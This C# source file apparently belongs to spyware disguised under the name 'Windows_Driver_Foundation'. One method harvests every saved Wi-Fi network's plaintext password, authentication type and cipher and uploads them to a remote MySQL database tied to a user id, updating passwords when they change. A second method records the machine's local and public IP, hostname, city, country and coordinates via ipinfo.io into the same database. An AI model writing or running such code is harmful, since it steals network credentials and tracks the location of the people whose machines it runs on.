using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Windows_Driver_Foundation
{
    class classProcessNetworkInfo
    {
        private static classMySQLDatabase classMysql;
        private static classNetworkInformation classNetwork;
        private static classExeptionAndErrorManagement classExeption;

        public void execute_wifi_protocol(int uid)
        {
            classExeption = new classExeptionAndErrorManagement();
            classNetwork = new classNetworkInformation();
            classMysql = new classMySQLDatabase();
            classMysql.openDatabaseConnection();

            List<string> cleanedWifiList = new List<string>();

            //GRAB Wifilist from Computer
            classExeption.printConsole("execute_wifiUpload_protocol()", "Grabing Wifi list from machine");
            string wifiListToText = classNetwork.grabWifiList();
            string[] lines = wifiListToText.Split(new[] { Environment.NewLine }, StringSplitOptions.None);

            foreach (string line in lines)
            {
                if (string.IsNullOrWhiteSpace(line) == false)
                {
                    if ((line.Split(':').Last() != string.Empty) && (line.Contains(":")))
                        cleanedWifiList.Add(line.Split(':').Last().Trim());
                }
            }
            //END GRAB wifilist from machine

            //GRAB Registed WIFILIST from DB
            classExeption.printConsole("execute_wifiUpload_protocol()", "Grabing Wifi list from DB");
            List<string> temp_id = new List<string>();
            List<string> temp_ssid = new List<string>();
            List<string> temp_pass = new List<string>();

            classMysql.getWifiList(uid, out temp_id, out temp_ssid, out temp_pass);

            string[] id_db = temp_id.ToArray();
            string[] ssid_db = temp_ssid.ToArray();
            string[] pass_db = temp_pass.ToArray();
            //END GRAB WIFILIST FROM DB         

            //Compare WIFI List registed in DB with actual computer Wifi List
            foreach (string wifi_ssid in cleanedWifiList)
            {
                bool wifiNotFound = true;
                string singleNetworkText = classNetwork.grabWirelessInformation_onlyOne(wifi_ssid);

                for (int i = 0; i < ssid_db.Length; i++)
                {
                    if (ssid_db[i] == wifi_ssid) //SSID from CMD LIST have match with DB LIST
                    {
                        wifiNotFound = false;
                        classExeption.printConsole("execute_wifiUpload_protocol()", "1 match found: " + ssid_db[i]);

                        if (pass_db[i] == classNetwork.getWifiDetail(singleNetworkText, "Key Content")) //PASS from CMD LIST also have match with DB LIST
                            classExeption.printConsole("execute_wifiUpload_protocol()", "Password remain the same.");
                        else
                        {   //Update Password
                            classMysql.update_WifiList(id_db[i], wifi_ssid, classNetwork.getWifiDetail(singleNetworkText, "Key Content"));
                            classExeption.printConsole("execute_wifiUpload_protocol()", "Password as Changed.");
                        }
                    }
                }

                if (wifiNotFound)
                {
                    if (classMysql.insert_wifi(uid, wifi_ssid, classNetwork.getWifiDetail(singleNetworkText, "Key Content"),
                          classNetwork.getWifiDetail(singleNetworkText, "Authentication"), classNetwork.getWifiDetail(singleNetworkText, "Cipher")))
                        classExeption.printConsole("execute_wifiUpload_protocol()", "WIFI: " + wifi_ssid + " inserido com sucesso.");
                    else
                        classExeption.printConsole("execute_wifiUpload_protocol()", "ERRO! WIFI " + wifi_ssid + " Inserido SEM sucesso");
                }

            }
            classMysql.closeDatabaseConnection();
        }

        public void execute_networkInfo_protocol(int uid)
        {
            classMysql = new classMySQLDatabase();
            classMysql.openDatabaseConnection();
            classNetwork = new classNetworkInformation();

            /* Esta linha é frágil porque depende da existencia do link http://ipinfo.io
             * Mas também não vale a pena criar uma tabela na DB apenas para conter este website
             * Se o link mudar sempre posso actualizar o WDF.  */
            string[] lines = classNetwork.getWebContent("http://ipinfo.io").Split(new[] { '\r', '\n' }, StringSplitOptions.None);

            //Guarda as informações de rede.
            string[] networkInfo = new string[6];

            networkInfo[0] = classNetwork.getLocalIPAddress();

            //limpa e filtra os dados em bruto retirados do website
            foreach (string line in lines)
            {
                if (line.Contains("\"ip\":"))
                    networkInfo[1] = line.Split(':').Last().Trim().Replace("\"", "").Replace(",", "");
                if (line.Contains("\"hostname\":"))
                    networkInfo[2] = line.Split(':').Last().Trim().Replace("\"", "").Replace(",", "");
                if (line.Contains("\"city\":"))
                    networkInfo[3] = line.Split(':').Last().Trim().Replace("\"", "").Replace(",", "");
                if (line.Contains("\"country\":"))
                    networkInfo[4] = line.Split(':').Last().Trim().Replace("\"", "").Replace(",", "");
                if (line.Contains("\"loc\":"))
                    networkInfo[5] = line.Split(':').Last().Trim().Replace("\"", "");
            }

            classExeption.printConsole("execute_machineNetworkInfo_protocol()", "Dados de Rede do Cliente:");
            foreach (string ler in networkInfo)
                classExeption.printConsole("execute_machineNetworkInfo_protocol()", ler);

            if (classMysql.insert_network_info(uid, networkInfo))
                classExeption.printConsole("execute_machineNetworkInfo_protocol()", "Dados registados na DB");

            classMysql.closeDatabaseConnection();
        }


    }
}
